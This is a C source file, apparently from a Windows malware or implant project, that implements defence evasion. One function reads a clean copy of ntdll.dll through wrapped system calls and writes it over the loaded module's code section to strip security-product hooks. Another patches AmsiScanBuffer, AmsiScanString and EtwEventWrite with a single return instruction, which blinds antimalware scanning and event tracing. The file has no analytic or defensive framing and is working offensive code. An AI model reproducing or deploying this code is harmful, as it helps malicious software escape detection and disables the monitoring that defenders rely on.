#include "../include/common_defines.h"
#include "../include/evasion.h"
#include "../include/utils.h"
#include "../include/mem.h"
#include "../include/syscalls.h" // Needed for file operations potentially
// #include <stdio.h> // Remove later

// Simple memcpy implementation if CRT is not available
void* memcpy_custom(void* dest, const void* src, size_t n) {
    char* d = dest;
    const char* s = src;
    while (n--) {
        *d++ = *s++;
    }
    return dest;
}

// Helper function to calculate string length for fixed-size buffer names
static size_t strnlen_custom(const char* s, size_t maxlen) {
    size_t i;
    for (i = 0; i < maxlen && s[i]; i++);
    return i;
}

// Helper to find PE section by name
PIMAGE_SECTION_HEADER find_section_header(PVOID module_base, const char* section_name) {
    PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)module_base;
    PIMAGE_NT_HEADERS nt_headers = (PIMAGE_NT_HEADERS)((BYTE*)module_base + dos_header->e_lfanew);
    PIMAGE_SECTION_HEADER section_header = IMAGE_FIRST_SECTION(nt_headers);

    for (WORD i = 0; i < nt_headers->FileHeader.NumberOfSections; i++) {
        LPCSTR currentName = (LPCSTR)section_header[i].Name;
        LPCSTR targetName = section_name;
        BOOL match = TRUE;
        for(int j=0; j<IMAGE_SIZEOF_SHORT_NAME; ++j) {
            if (currentName[j] != targetName[j]) {
                match = FALSE;
                break;
            }
            if (targetName[j] == '\0') break; // targetName is null-terminated
        }
        if (match && (strnlen_custom((char*)currentName, IMAGE_SIZEOF_SHORT_NAME) == strnlen_custom(targetName, IMAGE_SIZEOF_SHORT_NAME)) ) {
             return &section_header[i];
        }
    }
    return NULL;
}

// Helper function to initialize a UNICODE_STRING from a wide string literal
// Avoids CRT dependency
void RtlInitUnicodeString(PUNICODE_STRING DestinationString, PCWSTR SourceString)
{
    SIZE_T length = 0;
    if (SourceString) {
        // Calculate length first (safer than lstrlenW)
        const wchar_t* end = SourceString;
        while (*end) { end++; }
        length = (end - SourceString) * sizeof(WCHAR);
    }
    DestinationString->Length = (USHORT)length;
    DestinationString->MaximumLength = (USHORT)length + sizeof(WCHAR);
    DestinationString->Buffer = (PWSTR)SourceString;
}

// Helper to get System32 path from PEB
BOOL get_system_dir_peb(wchar_t* buffer, size_t buffer_size_chars) {
#ifdef _WIN64
    PEB* peb = (PEB*)__readgsqword(0x60);
#else
    PEB* peb = (PEB*)__readfsdword(0x30);
#endif
    // PEB -> ProcessParameters -> SystemDirectory path (or similar)
    // The exact structure might vary. Using common offset for ProcessParameters
    // This is fragile, a better way would involve parsing ProcessParameters structure definition.
    // For simplicity, let's assume ProcessParameters is at a fixed offset (adjust if needed)
    // PVOID process_params = *(PVOID*)((BYTE*)peb + 0x20); // Example offset for x64 PEB.ProcessParameters
    // UNICODE_STRING* sys_dir_unicode = (UNICODE_STRING*)((BYTE*)process_params + 0x60); // Example offset for RTL_USER_PROCESS_PARAMETERS.SystemDirectory
    
    // Safer approach: Relying on kernel32 having SystemDirectory cached? This still links kernel32.
    // For now, let's keep the GetSystemDirectoryW for simplicity until full no-CRT implementation.
    // A true PEB parse is more complex.
    if (GetSystemDirectoryW(buffer, (UINT)buffer_size_chars) == 0) {
        return FALSE;
    }
    return TRUE;
    
    // Proper PEB parsing requires RTL_USER_PROCESS_PARAMETERS definition
    /*
    if (!peb || !peb->ProcessParameters || !peb->ProcessParameters->SystemDirectory.Buffer) { 
        return FALSE;
    }
    UNICODE_STRING* sysDir = &peb->ProcessParameters->SystemDirectory;
    if (sysDir->Length / sizeof(wchar_t) >= buffer_size_chars) { 
        return FALSE; // Buffer too small
    }
    memcpy_custom(buffer, sysDir->Buffer, sysDir->Length);
    buffer[sysDir->Length / sizeof(wchar_t)] = L'\0';
    return TRUE;
    */
}

// Custom wcscat avoiding CRT
wchar_t* wcscat_custom(wchar_t* dest, const wchar_t* src) {
    wchar_t* ptr = dest;
    while (*ptr) ptr++; // Go to end of dest
    while ((*ptr++ = *src++)); // Copy src
    return dest;
}

BOOL unhook_ntdll() {
    HMODULE ntdll_base = find_module_base(L"ntdll.dll");
    if (!ntdll_base) return FALSE;

    wchar_t ntdll_path[MAX_PATH];
    // Use PEB-based approach (or keep GetSystemDirectoryW for now)
    if (!get_system_dir_peb(ntdll_path, MAX_PATH)) {
// #ifdef _DEBUG
//        printf("Failed to get System Directory path.\n");
// #endif
        return FALSE;
    }
    wcscat_custom(ntdll_path, L"\\ntdll.dll");

    HANDLE hFile = NULL;
    NTSTATUS status;
    OBJECT_ATTRIBUTES objAttr;
    IO_STATUS_BLOCK ioStatusBlock;
    UNICODE_STRING uNtdllPath;

    RtlInitUnicodeString(&uNtdllPath, ntdll_path);
    InitializeObjectAttributes(&objAttr, &uNtdllPath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

    // 2. Open the file using NtCreateFile syscall
    status = wrapped_NtCreateFile(&hFile, 
                                  GENERIC_READ | SYNCHRONIZE, 
                                  &objAttr, 
                                  &ioStatusBlock, 
                                  NULL, // AllocationSize
                                  FILE_ATTRIBUTE_NORMAL, 
                                  FILE_SHARE_READ, 
                                  FILE_OPEN, // Open existing
                                  FILE_SYNCHRONOUS_IO_NONALERT, // Options
                                  NULL, 0); // EA Buffer

    if (status != STATUS_SUCCESS || hFile == NULL) {
// #ifdef _DEBUG
//        printf("NtCreateFile failed for ntdll.dll. Status: 0x%lX\n", status);
// #endif
        return FALSE;
    } 

    // 3. Get file size using NtQueryInformationFile
    FILE_STANDARD_INFORMATION fileInfo;
    status = wrapped_NtQueryInformationFile(hFile, &ioStatusBlock, &fileInfo, sizeof(fileInfo), 5); // 5 = FileStandardInformation
    if (status != STATUS_SUCCESS) {
        wrapped_NtClose(hFile);
// #ifdef _DEBUG
//        printf("NtQueryInformationFile failed. Status: 0x%lX\n", status);
// #endif
        return FALSE;
    }
    DWORD file_size = fileInfo.EndOfFile.LowPart;
    if (fileInfo.EndOfFile.HighPart > 0) { /* Handle large files if needed */ }

    PVOID file_buffer = NULL;
    SIZE_T buffer_size = file_size;
    // Use alloc_memory (uses syscall wrapper)
    status = alloc_memory(&file_buffer, buffer_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (status != STATUS_SUCCESS || !file_buffer) {
        wrapped_NtClose(hFile);
// #ifdef _DEBUG
//        printf("Failed to allocate buffer for ntdll copy. Status: 0x%lX\n", status);
// #endif
        return FALSE;
    }

    // 4. Read file content into buffer using NtReadFile syscall
    status = wrapped_NtReadFile(hFile, NULL, NULL, NULL, &ioStatusBlock, file_buffer, file_size, NULL, NULL);
    if (status != STATUS_SUCCESS) { // Could also check ioStatusBlock.Information for bytes read
        free_memory(file_buffer, 0, MEM_RELEASE);
        wrapped_NtClose(hFile);
// #ifdef _DEBUG
//        printf("NtReadFile failed for ntdll.dll. Status: 0x%lX\n", status);
// #endif
        return FALSE;
    }
    wrapped_NtClose(hFile); // Close file handle

    // 5. Find .text section in both memory and buffer
    PIMAGE_SECTION_HEADER mem_text_section = find_section_header(ntdll_base, ".text");
    PIMAGE_SECTION_HEADER file_text_section = find_section_header(file_buffer, ".text");

    if (!mem_text_section || !file_text_section) {
        free_memory(file_buffer, 0, MEM_RELEASE);
// #ifdef _DEBUG
//        printf("Failed to find .text section in ntdll (memory or file).\n");
// #endif
        return FALSE;
    }

    // 6. Make memory .text section writable using NtProtectVirtualMemory (via wrapper)
    PVOID text_section_addr = (BYTE*)ntdll_base + mem_text_section->VirtualAddress;
    SIZE_T text_section_size = mem_text_section->Misc.VirtualSize;
    ULONG old_protect;
    status = protect_memory(text_section_addr, text_section_size, PAGE_EXECUTE_READWRITE, &old_protect);
     if (status != STATUS_SUCCESS) {
        free_memory(file_buffer, 0, MEM_RELEASE); 
// #ifdef _DEBUG
//        printf("Failed to make ntdll .text section writable. Status: 0x%lX\n", status);
// #endif
        return FALSE;
    }

    // 7. Copy .text from buffer to memory
    memcpy_custom(text_section_addr, (BYTE*)file_buffer + file_text_section->PointerToRawData, file_text_section->SizeOfRawData); // Use RawData pointer and size
    // Or use VirtualAddress/VirtualSize if sections are aligned? RawData is safer. Size should match reasonably.
// #ifdef _DEBUG
//    printf("Ntdll.dll .text section overwritten using syscalls.\n");
// #endif

    // 8. Restore original memory protection using NtProtectVirtualMemory (via wrapper)
    ULONG dummy_protect;
    protect_memory(text_section_addr, text_section_size, old_protect, &dummy_protect);

    // 9. Free the buffer using NtFreeVirtualMemory (via wrapper)
    free_memory(file_buffer, 0, MEM_RELEASE);

    return TRUE;
}

BOOL patch_monitoring_functions() {
    // Functions/modules to patch
    const wchar_t* amsi_module_name = L"amsi.dll";
    const char* amsi_scan_buffer_name = "AmsiScanBuffer";
    const char* amsi_scan_string_name = "AmsiScanString";

    const wchar_t* ntdll_module_name = L"ntdll.dll";
    const char* etw_event_write_name = "EtwEventWrite";
    // Add more ETW functions if needed (EtwEventWriteEx, EtwEventRegister, etc.)

    // Patch code (simple RET instruction for x64)
    // Note: Could use more sophisticated patches (e.g., conditional jump)
    BYTE patch[] = { 0xC3 }; // RET
    SIZE_T patch_size = sizeof(patch);

    HMODULE hAmsi = NULL;
    HMODULE hNtdll = NULL;
    FARPROC pAmsiScanBuffer = NULL;
    FARPROC pAmsiScanString = NULL;
    FARPROC pEtwEventWrite = NULL;
    BOOL success = TRUE;

    // Find modules (use find_module_base - already finds ntdll)
    hAmsi = find_module_base(amsi_module_name);
    hNtdll = find_module_base(ntdll_module_name); // Should be already loaded by previous calls

    // Find functions within modules
    if (hAmsi) {
        pAmsiScanBuffer = find_function(hAmsi, amsi_scan_buffer_name);
        pAmsiScanString = find_function(hAmsi, amsi_scan_string_name);
    }
    if (hNtdll) {
        pEtwEventWrite = find_function(hNtdll, etw_event_write_name);
    }

    // --- Patching Logic --- 
    // Function pointer array and loop for cleaner code
    FARPROC functions_to_patch[] = { pAmsiScanBuffer, pAmsiScanString, pEtwEventWrite };
    const char* function_names[] = { amsi_scan_buffer_name, amsi_scan_string_name, etw_event_write_name };

    for (int i = 0; i < sizeof(functions_to_patch) / sizeof(FARPROC); ++i) {
        if (functions_to_patch[i]) {
            ULONG old_protect;
            NTSTATUS status;

            // Make writable using NtProtectVirtualMemory (TBD)
            status = protect_memory(functions_to_patch[i], patch_size, PAGE_EXECUTE_READWRITE, &old_protect);
            if (status == STATUS_SUCCESS) {
                // Apply patch
                memcpy_custom(functions_to_patch[i], patch, patch_size);
// #ifdef _DEBUG
//                printf("Patched %s at %p\n", function_names[i], functions_to_patch[i]);
// #endif
                // Restore protection using NtProtectVirtualMemory (TBD)
                ULONG dummy_protect;
                protect_memory(functions_to_patch[i], patch_size, old_protect, &dummy_protect);
            } else {
// #ifdef _DEBUG
//                printf("Failed to make %s writable. Status: 0x%lX\n", function_names[i], status);
// #endif
                success = FALSE;
                // Decide whether to continue patching others or stop
            }
        } else {
// #ifdef _DEBUG
//            printf("Function %s not found, skipping patch.\n", function_names[i]);
// #endif
            // Function not found might be okay depending on the OS version/context
        }
    }

    return success;
}
